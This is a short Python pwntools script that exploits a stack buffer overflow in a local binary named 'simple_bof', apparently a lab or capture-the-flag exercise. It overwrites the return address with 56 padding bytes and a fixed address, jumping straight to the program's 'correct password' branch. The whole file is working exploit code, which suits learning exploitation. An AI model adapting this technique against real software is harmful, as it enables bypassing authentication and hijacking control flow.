#!/usr/bin/python3
from pwn import *

# set context debug level if you need more verbose details of what's being sent
# context(os="linux", arch="amd64")
# context.log_level = 'debug'
elf = context.binary = ELF("simple_bof")

# add your gdb commands here
gs = '''
b *main+126
c
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
    
io = start()
io.timeout = 0.1

# ---------------------------------------------------

# will make the execution go to the "correct password" if/else branch
# then program will die (as RBP is now cluttered with 'A's )
correct_pwd_addr = 0x000000000040119e

# use this to check where the correct $RIP offset will be found
#payload = cyclic(64)
#offset = cyclic_find('oaaa')
#io.info(f"offset found at: {offset}")

payload = b"A" * 56
payload += p64(correct_pwd_addr)

io.info("Sending payload...")
io.sendline(payload)

io.interactive()